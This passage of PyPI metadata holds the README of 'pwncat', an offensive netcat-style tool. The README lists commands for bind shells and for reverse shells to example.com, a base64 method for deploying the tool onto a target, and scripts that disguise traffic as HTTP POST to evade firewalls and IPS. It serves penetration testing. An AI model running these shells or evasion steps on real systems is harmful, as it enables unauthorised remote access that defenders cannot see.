*emulate* asymmetry. You could do the same and implement GPG based asymmetric encryption for PSE.\n\n```bash\n# server\npwncat -vvvv -l localhost 4444 \\\n  --script-send pse/asym-enc/pse-asym_enc-server_send.py \\\n  --script-recv pse/asym-enc/pse-asym_enc-server_recv.py\n```\n```bash\n# client\npwncat -vvvv localhost 4444 \\\n  --script-send pse/asym-enc/pse-asym_enc-client_send.py \\\n  --script-recv pse/asym-enc/pse-asym_enc-client_recv.py\n```\n\n#### Example 2: Self-built HTTP POST wrapper\n\n> PSE: [http-post](pse/http-post) source code\n\nThis will wrap all traffic into a valid HTTP POST request, making it look like normal HTTP traffic.\n\n```bash\n# server\npwncat -vvvv -l localhost 4444 \\\n  --script-send pse/http-post/pse-http_post-pack.py \\\n  --script-recv pse/http-post/pse-http_post-unpack.py\n```\n```bash\n# client\npwncat -vvvv localhost 4444 \\\n  --script-send pse/http-post/pse-http_post-pack.py \\\n  --script-recv pse/http-post/pse-http_post-unpack.py\n```\n\n\n## :information_source: FAQ\n\n**Q**: Is `pwncat` compatible with `netcat`?\n\n**A**: Yes, it is fully compatible in the way it behaves in connect, listen and zero-i/o mode.\n\n\n**Q**: Does it work on X?\n\n**A**: In its current state it works with Python 2 and 3 and is fully tested on Linux and MacOS. Windows support is still experimental.\n\n\n**Q**: I found a bug / I have to suggest a new feature! What can I do?\n\n**A**: For bug reports or enhancements, please open an issue [here](https://github.com/cytopia/pwncat/issues).\n\n\n## :lock: [cytopia](https://github.com/cytopia) sec tools\n\nBelow is a list of sec tools and docs I am maintaining.\n\n| Name                 | Category             | Language   | Description |\n|----------------------|----------------------|------------|-------------|\n| **[offsec]**         | Documentation        | Markdown   | Offsec checklist, tools and examples |\n| **[header-fuzz]**    | Enumeration          | Bash       | Fuzz HTTP headers |\n| **[smtp-user-enum]** | Enumeration          | Python 2+3 | SMTP users enumerator |\n| **[urlbuster]**      | Enumeration          | Python 2+3 | Mutable web directory fuzzer |\n| **[pwncat]**         | Pivoting             | Python 2+3 | Cross-platform netcat on steroids |\n| **[badchars]**       | Reverse Engineering  | Python 2+3 | Badchar generator |\n| **[fuzza]**          | Reverse Engineering  | Python 2+3 | TCP fuzzing tool |\n\n[offsec]: https://github.com/cytopia/offsec\n[header-fuzz]: https://github.com/cytopia/header-fuzz\n[smtp-user-enum]: https://github.com/cytopia/smtp-user-enum\n[urlbuster]: https://github.com/cytopia/urlbuster\n[pwncat]: https://github.com/cytopia/pwncat\n[badchars]: https://github.com/cytopia/badchars\n[fuzza]: https://github.com/cytopia/fuzza\n\n\n## :octocat: Contributing\n\nSee **[Contributing guidelines](CONTRIBUTING.md)** to help to improve this project.\n\n\n## :exclamation: Disclaimer\n\nThis tool may be used for legal purposes only. Users take full responsibility for any actions performed using this tool. The author accepts no liability for damage caused by this tool. If these terms are not acceptable to you, then do not use this tool.\n\n\n## :page_facing_up: License\n\n**[MIT License](LICENSE.txt)**\n\nCopyright (c) 2020 **[cytopia](https://github.com/cytopia)**\n\n\n", "description_content_type": "text/markdown", "docs_url": null, "download_url": "", "downloads": {"last_day": -1, "last_month": -1, "last_week": -1}, "home_page": "https://github.com/cytopia/pwncat", "keywords": "", "license": "MIT", "maintainer": "", "maintainer_email": "", "name": "pwncat", "package_url": "https://pypi.org/project/pwncat/", "platform": "", "project_url": "https://pypi.org/project/pwncat/", "project_urls": {"Homepage": "https://github.com/cytopia/pwncat"}, "release_url": "https://pypi.org/project/pwncat/0.0.12a0/", "requires_dist": null, "requires_python": "", "summary": "Netcat on steroids with Firewall and IPS evasion, bind and reverse shell, port-forwarding and scripting engine (PSE).", "version": "0.0.12a0", "yanked": false, "html_description": "<div class=\"project-description\">\n            <h1>pwncat</h1>\n<p><strong><a href=\"#tada-install\" rel=\"nofollow\">Install</a></strong> |\n<strong><a href=\"#coffee-tldr\" rel=\"nofollow\">TL;DR</a></strong> |\n<strong><a href=\"#star-features\" rel=\"nofollow\">Features</a></strong> |\n<strong><a href=\"#cop-behaviour\" rel=\"nofollow\">Behaviour</a></strong> |\n<strong><a href=\"#closed_book-documentation\" rel=\"nofollow\">Docs</a></strong> |\n<strong><a href=\"#computer-usage\" rel=\"nofollow\">Usage</a></strong> |\n<strong><a href=\"#bulb-examples\" rel=\"nofollow\">Examples</a></strong> |\n<strong><a href=\"#information_source-faq\" rel=\"nofollow\">FAQ</a></strong> |\n<strong><a href=\"#octocat-contributing\" rel=\"nofollow\">Contributing</a></strong> |\n<strong><a href=\"#exclamation-disclaimer\" rel=\"nofollow\">Disclaimer</a></strong> |\n<strong><a href=\"#page_facing_up-license\" rel=\"nofollow\">License</a></strong></p>\n<p><a href=\"https://github.com/psf/black\" rel=\"nofollow\"><img alt=\"\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/fbfdc7754183ecf079bc71ddeabaf88f6cbc5c00/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f636f64652532307374796c652d626c61636b2d3030303030302e737667\"></a>\n<a href=\"https://pypi.org/project/pwncat/\" rel=\"nofollow\"><img alt=\"PyPI\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/761ed0bf12dcd392122124a6985074247cda8214/68747470733a2f2f696d672e736869656c64732e696f2f707970692f762f70776e636174\"></a>\n<a href=\"https://pypi.org/project/pwncat/\" rel=\"nofollow\"><img alt=\"PyPI - Status\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/1dfcc247a53e90753102bb04f185064186314efb/68747470733a2f2f696d672e736869656c64732e696f2f707970692f7374617475732f70776e636174\"></a>\n<a href=\"https://pypi.org/project/pwncat/\" rel=\"nofollow\"><img alt=\"PyPI - Python Version\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/b009b5e60e899f866c8ca17a458c2b527e1ff5c3/68747470733a2f2f696d672e736869656c64732e696f2f707970692f707976657273696f6e732f70776e636174\"></a>\n<a href=\"https://pypi.org/project/pwncat/\" rel=\"nofollow\"><img alt=\"PyPI - Format\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/485225314b5687cd28db13e5141b0340b1d5d8ac/68747470733a2f2f696d672e736869656c64732e696f2f707970692f666f726d61742f70776e636174\"></a>\n<a href=\"https://pypi.org/project/pwncat/\" rel=\"nofollow\"><img alt=\"PyPI - Implementation\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/c7c9e896f1a155b23e6962a4a0bd97b89017170b/68747470733a2f2f696d672e736869656c64732e696f2f707970692f696d706c656d656e746174696f6e2f70776e636174\"></a>\n<a href=\"https://pypi.org/project/pwncat/\" rel=\"nofollow\"><img alt=\"PyPI - License\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/a75f25316407c96f0278c60b740d1d61a304c6d6/68747470733a2f2f696d672e736869656c64732e696f2f707970692f6c2f70776e636174\"></a></p>\n<p><a href=\"https://github.com/cytopia/pwncat/actions?workflow=linting\" rel=\"nofollow\"><img alt=\"Build Status\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/12c34d5512900bdd556c9fe96d50203cd3c9216a/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f6c696e74696e672f62616467652e737667\"></a>\n<a href=\"https://github.com/cytopia/pwncat/actions?workflow=building\" rel=\"nofollow\"><img alt=\"Build Status\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/52e8fd27dbbfd4b30c2e24d845d199d7dbe39a3c/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f6275696c64696e672f62616467652e737667\"></a></p>\n<blockquote>\n<p>\u00a0</p>\n<h4>Netcat on steroids with Firewall and IDS/IPS evasion, bind and reverse shell, port forwarding magic and scripting engine (<a href=\"pse/\" rel=\"nofollow\">PSE</a>).</h4>\n<p>\u00a0</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th>:warning: Warning: it is currently in feature-incomplete alpha state. Expect bugs and options to change. (<a href=\"https://github.com/cytopia/pwncat/issues/2\" rel=\"nofollow\">Roadmap</a>)</th>\n</tr>\n</thead></table>\n<table>\n <thead>\n  <tr>\n   <th>Code Style\n   </th><th>\n   </th><th>Integration Tests\n  </th></tr>\n </thead>\n <tbody>\n  <tr>\n   <td>\n    <table>\n     <thead>\n      <tr>\n       <th>Styler</th>\n       <th>Status</th>\n      </tr>\n     </thead>\n     <tbody>\n      <tr>\n       <td><a href=\"https://github.com/psf/black\" rel=\"nofollow\">Black</a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=black\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/1e7a878c9de95dc3b2f8dc953b2310c885dd1525/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f626c61636b2f62616467652e737667\"></a></td>\n      </tr>\n      <tr>\n       <td><a href=\"https://github.com/python/mypy\" rel=\"nofollow\">mypy</a> <sup>&lt;small&gt;[1]&lt;/small&gt;</sup></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mypy\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/b7458fe6512cc108b9e9241ee9d3422a79b63d43/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f6d7970792f62616467652e737667\"></a></td>\n      </tr>\n      <tr>\n       <td><a href=\"https://github.com/PyCQA/pycodestyle\" rel=\"nofollow\">pycodestyle</a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=pycode\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/bcbb143f183a99fe2660be34ed52b97eb963e1c0/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f7079636f64652f62616467652e737667\"></a></td>\n      </tr>\n      <tr>\n       <td><a href=\"https://github.com/PyCQA/pydocstyle\" rel=\"nofollow\">pydocstyle</a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=pydoc\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/a4b087bca283d845e5740060bfb1923f8765a9c3/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f7079646f632f62616467652e737667\"></a></td>\n      </tr>\n      <tr>\n       <td><a href=\"https://github.com/PyCQA/pylint\" rel=\"nofollow\">pylint</a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=pylint\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/4641a61fc8a00cdb901b32a157f598eb1e9d05b4/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f70796c696e742f62616467652e737667\"></a></td>\n      </tr>\n     </tbody>\n    </table>\n   </td>\n   <td></td>\n   <td>\n    <table>\n     <thead>\n      <tr>\n       <th><sub>Python</sub><sup>OS</sup></th>\n       <th>Linux</th>\n       <th>MacOS</th>\n       <th>Windows <sup>&lt;small&gt;[2]&lt;/small&gt;</sup></th>\n      </tr>\n     </thead>\n     <tbody>\n      <tr>\n       <th>2.7</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-2.7\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/8aede12651d4f1cb26782c4b14582ca99f63ce8b/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f7562752d322e372f62616467652e737667\"></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-2.7\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/ca879188cbe65b065f8b214b50b871d3cf2ac7ce/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f6d61632d322e372f62616467652e737667\"></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-2.7\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/9cdfa22dfee07b65a9405f8e505011fe25395575/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f77696e2d322e372f62616467652e737667\"></a></td>\n      </tr>\n      <tr>\n       <th>3.5</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-3.5\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/1d5ac5293ee9f4d8afa00c921c2addb2684a0d01/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f7562752d332e352f62616467652e737667\"></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-3.5\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/a5fc246df4e4c7300fa2f7e744d4a068eea80f76/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f6d61632d332e352f62616467652e737667\"></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-3.5\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/424bcb189a9a91affae392cbfc2548a670048677/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f77696e2d332e352f62616467652e737667\"></a></td>\n      </tr>\n      <tr>\n       <th>3.6</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-3.6\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/7de4d2e2d372271e8f2e2a27323288e113aa2667/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f7562752d332e362f62616467652e737667\"></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-3.6\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/f9d6042777eae640e169baa926f9c3b86b12ae52/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f6d61632d332e362f62616467652e737667\"></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-3.6\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/11c30c3c26506a5eb0338fc76dd58182f64bfc36/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f77696e2d332e362f62616467652e737667\"></a></td>\n      </tr>\n      <tr>\n       <th>3.7</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-3.7\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/be4f609b08ee87951f8971b07f4c2246199f2571/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f7562752d332e372f62616467652e737667\"></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-3.7\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/a7af2c646b2a9f763cb242dba243c6b840f61bac/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f6d61632d332e372f62616467652e737667\"></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-3.7\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/0574b42c04dad7da41b46fb56e527e7d3cf62023/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f77696e2d332e372f62616467652e737667\"></a></td>\n      </tr>\n      <tr>\n       <th>3.8</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-3.8\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/b1a8b455ade8835a5de67c2c6f86a5f63aacc08a/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f7562752d332e382f62616467652e737667\"></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-3.8\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/e92a2a94ca1b2bfa41d71062cc63a6ea727f7f99/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f6d61632d332e382f62616467652e737667\"></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-3.8\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/4537f0424e5bbdb5412d8b1412e256c603bd06d9/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f77696e2d332e382f62616467652e737667\"></a></td>\n      </tr>\n      <tr>\n       <th>pypy2</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-py2\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/641f144c9f2a3c04fa3bfd99c70326735129777e/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f7562752d7079322f62616467652e737667\"></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-py2\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/050b65e25268ce2d79bce2419f7dac528cd31caf/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f6d61632d7079322f62616467652e737667\"></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-py2\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/2cd93784e670a70cf8f7920f1f7cd026762f7662/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f77696e2d7079322f62616467652e737667\"></a></td>\n      </tr>\n      <tr>\n       <th>pypy3</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-py3\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/9c1571dd8b34fc7129cd2a2507dff6ecb74842ca/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f7562752d7079332f62616467652e737667\"></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-py3\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/bb7645eadddfa3e7143770bab411a1b64a4eeb40/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f6d61632d7079332f62616467652e737667\"></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-py3\" rel=\"nofollow\"><img src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/89436d9ef43465879f9dee79dd523fe4a18b27c2/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f70776e6361742f776f726b666c6f77732f77696e2d7079332f62616467652e737667\"></a></td>\n      </tr>\n     </tbody>\n    </table>\n   </td>\n  </tr>\n </tbody>\n</table>\n<blockquote>\n<p><sup>[1] <a href=\"https://cytopia.github.io/pwncat/pwncat.type.html\" rel=\"nofollow\">mypy type coverage</a> <strong>(fully typed: 93.51%)</strong></sup><br>\n<sup>[2] Windows builds are currently only failing, because they are simply stuck on GitHub actions.</sup></p>\n</blockquote>\n<h4>Motivation</h4>\n<p>Ever accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd> on your reverse shell and it was gone for good?\nEver waited forever for your client to connect back to you, because the Firewall didn't let it out?\nEver had a connection loss because an IPS closed suspicious ports?\nEver were in need of a quick port forwarding?<br></p>\n<blockquote>\n<p><strong>This one got you covered.</strong></p>\n</blockquote>\n<p>Apart from that the current features of <code>nc</code>, <code>ncat</code> or <code>socat</code> just didn't feed my needs and I also wanted to have a single\ntool that works on older and newer machines (hence Python 2+3 compat). Most importantly I wanted to have it in a language that I can understand and provide my own features with.\n(Wait for it, binary releases for Linux, MacOS and Windows will come shortly).</p>\n<h2>:tada: Install</h2>\n<pre>pip install pwncat\n</pre>\n<h2>:coffee: TL;DR</h2>\n<p>This is just a quick get-you-started overview. For more advanced techniques see <strong><a href=\"#computer-usage\" rel=\"nofollow\">:computer: Usage</a></strong> or <strong><a href=\"#bulb-examples\" rel=\"nofollow\">:bulb: Examples</a></strong>.</p>\n<h3>Deploy to target</h3>\n<pre><span class=\"c1\"># Copy base64 data to clipboard from where you have internet access</span>\ncurl https://raw.githubusercontent.com/cytopia/pwncat/master/bin/pwncat <span class=\"p\">|</span> base64\n\n<span class=\"c1\"># Paste it on the target machine</span>\n<span class=\"nb\">echo</span> <span class=\"s2\">\"&lt;BASE64 STRING&gt;\"</span> <span class=\"p\">|</span> base64 -d &gt; pwncat\nchmod +x pwncat\n</pre>\n<h3>Summon shells</h3>\n<pre><span class=\"c1\"># Bind shell</span>\npwncat -l -e <span class=\"s1\">'/bin/bash'</span> <span class=\"m\">8080</span>\n</pre>\n<pre><span class=\"c1\"># Reverse shell (Ctrl+c proof)</span>\npwncat -e <span class=\"s1\">'/bin/bash'</span> example.com <span class=\"m\">4444</span> --recon --recon-wait <span class=\"m\">10</span>\n</pre>\n<pre><span class=\"c1\"># Reverse UDP shell (Ctrl+c proof)</span>\npwncat -e <span class=\"s1\">'/bin/bash'</span> example.com <span class=\"m\">4444</span> -u --ping-intvl <span class=\"m\">10</span>\n</pre>\n<h3>Local port forward <code>-L</code> (listening proxy)</h3>\n<pre><span class=\"c1\"># Make remote MySQL server (remote port 3306) available on current machine</span>\n<span class=\"c1\"># on every interface on port 5000</span>\npwncat -L <span class=\"m\">0</span>.0.0.0:5000 everythingcli.org <span class=\"m\">3306</span>\n</pre>\n<pre><span class=\"c1\"># Same, but convert traffic on your end to UDP</span>\npwncat -L <span class=\"m\">0</span>.0.0.0:5000 everythingcli.org <span class=\"m\">3306</span> -u\n</pre>\n<h3>Remote port forward <code>-R</code> (double client Proxy)</h3>\n<pre><span class=\"c1\"># Connect to Remote MySQL server (remote port 3306) and then connect to another</span>\n<span class=\"c1\"># pwncat/netcat server on 10.0.0.1:4444 and bridge traffic</span>\npwncat -R <span class=\"m\">10</span>.0.0.1:4444 everythingcli.org <span class=\"m\">3306</span>\n</pre>\n<pre><span class=\"c1\"># Same, but convert traffic on your end to UDP</span>\npwncat -R <span class=\"m\">10</span>.0.0.1:4444 everythingcli.org <span class=\"m\">3306</span> -u\n</pre>\n<blockquote>\n<p><sub><a href=\"https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/\" rel=\"nofollow\">SSH Tunnelling for fun and profit :link:</a></sub><br>\n<sub><a href=\"#port-forwarding-magic\" rel=\"nofollow\"><code>pwncat</code> example: Port forwarding magic</a><sub></sub></sub></p>\n</blockquote>\n<h2>:star: Features</h2>\n<h3>At a glance</h3>\n<p><code>pwncat</code> has many features, below is only a list of outstanding characteristics.</p>\n<table>\n<thead>\n<tr>\n<th>Feature</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><a href=\"pse\" rel=\"nofollow\">PSE</a></td>\n<td>pwncat scripting engine to apply custom Python scripts for sent and/or received data</td>\n</tr>\n<tr>\n<td>Bind shell</td>\n<td>Create bind shells</td>\n</tr>\n<tr>\n<td>Reverse shell</td>\n<td>Create reverse shells</td>\n</tr>\n<tr>\n<td>Port Forward</td>\n<td>Local and remote port forward (Proxy server/client)</td>\n</tr>\n<tr>\n<td><kbd>Ctrl</kbd>+<kbd>c</kbd></td>\n<td>Reverse shell can reconnect if you accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd></td>\n</tr>\n<tr>\n<td>Detect Egress</td>\n<td>Scan and report open egress ports on the target</td>\n</tr>\n<tr>\n<td>Evade FW</td>\n<td>Evade egress firewalls by round-robin outgoing ports</td>\n</tr>\n<tr>\n<td>Evade IPS</td>\n<td>Evade Intrusion Prevention Systems by being able to round-robin outgoing ports on connection interrupts</td>\n</tr>\n<tr>\n<td>UDP rev shell</td>\n<td>Try this with the traditional <code>netcat</code></td>\n</tr>\n<tr>\n<td>TCP / UDP</td>\n<td>Full TCP and UDP support</td>\n</tr>\n<tr>\n<td>Python 2+3</td>\n<td>Works with Python 2 and Python 3</td>\n</tr>\n<tr>\n<td>Cross OS</td>\n<td>Should work on Linux, MacOS and Windows as long as Python is available</td>\n</tr>\n<tr>\n<td>Compatability</td>\n<td>Use the traditional <code>netcat</code> as a client or server together with <code>pwncat</code></td>\n</tr></tbody></table>\n<h3>Feature comparison matrix</h3>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>pwncat</th>\n<th>netcat</th>\n<th>ncat</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Scripting engine</td>\n<td>Python</td>\n<td>:x:</td>\n<td>Lua</td>\n</tr>\n<tr>\n<td>IP ToS</td>\n<td>:x:</td>\n<td>\u2714</td>\n<td>:x:</td>\n</tr>\n<tr>\n<td>IPv4</td>\n<td>\u2714</td>\n<td>\u2714</td>\n<td>\u2714</td>\n</tr>\n<tr>\n<td>IPv6</td>\n<td>*</td>\n<td>\u2714</td>\n<td>\u2714</td>\n</tr>\n<tr>\n<td>Unix domain sockets</td>\n<td>:x:</td>\n<td>\u2714</td>\n<td>\u2714</td>\n</tr>\n<tr>\n<td>TCP</td>\n<td>\u2714</td>\n<td>\u2714</td>\n<td>\u2714</td>\n</tr>\n<tr>\n<td>UDP</td>\n<td>\u2714</td>\n<td>\u2714</td>\n<td>\u2714</td>\n</tr>\n<tr>\n<td>SCTP</td>\n<td>:x:</td>\n<td>:x:</td>\n<td>\u2714</td>\n</tr>\n<tr>\n<td>Command exec</td>\n<td>\u2714</td>\n<td>\u2714</td>\n<td>\u2714</td>\n</tr>\n<tr>\n<td>Inbound port scan</td>\n<td>*</td>\n<td>\u2714</td>\n<td>\u2714</td>\n</tr>\n<tr>\n<td>Outbound port scan</td>\n<td>*</td>\n<td>:x:</td>\n<td>:x:</td>\n</tr>\n<tr>\n<td>Hex dump</td>\n<td>*</td>\n<td>\u2714</td>\n<td>\u2714</td>\n</tr>\n<tr>\n<td>Telnet</td>\n<td>:x:</td>\n<td>\u2714</td>\n<td>\u2714</td>\n</tr>\n<tr>\n<td>SSL</td>\n<td>:x:</td>\n<td>:x:</td>\n<td>\u2714</td>\n</tr>\n<tr>\n<td>HTTP</td>\n<td>*</td>\n<td>:x:</td>\n<td>:x:</td>\n</tr>\n<tr>\n<td>HTTPS</td>\n<td>*</td>\n<td>:x:</td>\n<td>:x:</td>\n</tr>\n<tr>\n<td>Chat</td>\n<td>\u2714</td>\n<td>\u2714</td>\n<td>\u2714</td>\n</tr>\n<tr>\n<td>Broker</td>\n<td>:x:</td>\n<td>:x:</td>\n<td>\u2714</td>\n</tr>\n<tr>\n<td>Simultaneous conns</td>\n<td>:x:</td>\n<td>:x:</td>\n<td>\u2714</td>\n</tr>\n<tr>\n<td>Allow/deny</td>\n<td>:x:</td>\n<td>:x:</td>\n<td>\u2714</td>\n</tr>\n<tr>\n<td>Local port forward</td>\n<td>\u2714</td>\n<td>:x:</td>\n<td>:x:</td>\n</tr>\n<tr>\n<td>Remote port forward</td>\n<td>\u2714</td>\n<td>:x:</td>\n<td>:x:</td>\n</tr>\n<tr>\n<td>Re-accept</td>\n<td>\u2714</td>\n<td>\u2714</td>\n<td>\u2714</td>\n</tr>\n<tr>\n<td>Proxy</td>\n<td>:x:</td>\n<td>\u2714</td>\n<td>\u2714</td>\n</tr>\n<tr>\n<td>UDP reverse shell</td>\n<td>\u2714</td>\n<td>:x:</td>\n<td>:x:</td>\n</tr>\n<tr>\n<td>Respawning client</td>\n<td>\u2714</td>\n<td>:x:</td>\n<td>:x:</td>\n</tr>\n<tr>\n<td>Port hopping</td>\n<td>*</td>\n<td>:x:</td>\n<td>:x:</td>\n</tr>\n<tr>\n<td>Emergency shutdown</td>\n<td>\u2714</td>\n<td>:x:</td>\n<td>:x:</td>\n</tr></tbody></table>\n<blockquote>\n<p><sup><code>*</code> Feature is currently under development.</sup></p>\n</blockquote>\n<h2>:cop: Behaviour</h2>\n<p>Like the original implementation of <code>netcat</code>, when using <strong>TCP</strong>, <code>pwncat</code>\n(in client and listen mode) will automatically quit, if the network connection has been terminated,\nproperly or improperly.</p>\n<p>In case the remote peer does not terminate the connection, or in <strong>UDP</strong> mode, <code>pwncat</code> will stay open.</p>\n<p>Have a look at the following illustratoins to better understand the behaviour:</p>\n<pre><span class=\"c1\"># [Valid HTTP request] Does not quit, web server keeps connection intact</span>\n<span class=\"nb\">printf</span> <span class=\"s2\">\"GET / HTTP/1.1\\n\\n\"</span> <span class=\"p\">|</span> pwncat www.google.com <span class=\"m\">80</span>\n</pre>\n<pre><span class=\"c1\"># [Invalid HTTP request] Quits, because the web server closes the connection</span>\n<span class=\"nb\">printf</span> <span class=\"s2\">\"GET / \\n\\n\"</span> <span class=\"p\">|</span> pwncat www.google.com <span class=\"m\">80</span>\n</pre>\n<pre><span class=\"c1\"># [TCP]</span>\n<span class=\"c1\"># Neither of both, client and server will quit after successful transfer</span>\n<span class=\"c1\"># and they will be stuck, waiting for more input or output.</span>\n<span class=\"c1\"># When exiting one (e.g.: via Ctrl+c), the other one will quit as well.</span>\npwncat -l <span class=\"m\">4444</span> &gt; output.txt\npwncat localhost <span class=\"m\">4444</span> &lt; input.txt\n</pre>\n<pre><span class=\"c1\"># [UDP]</span>\n<span class=\"c1\"># Neither of both, client and server will quit after successful transfer</span>\n<span class=\"c1\"># and they will be stuck, waiting for more input or output.</span>\n<span class=\"c1\"># When exiting one (e.g.: via 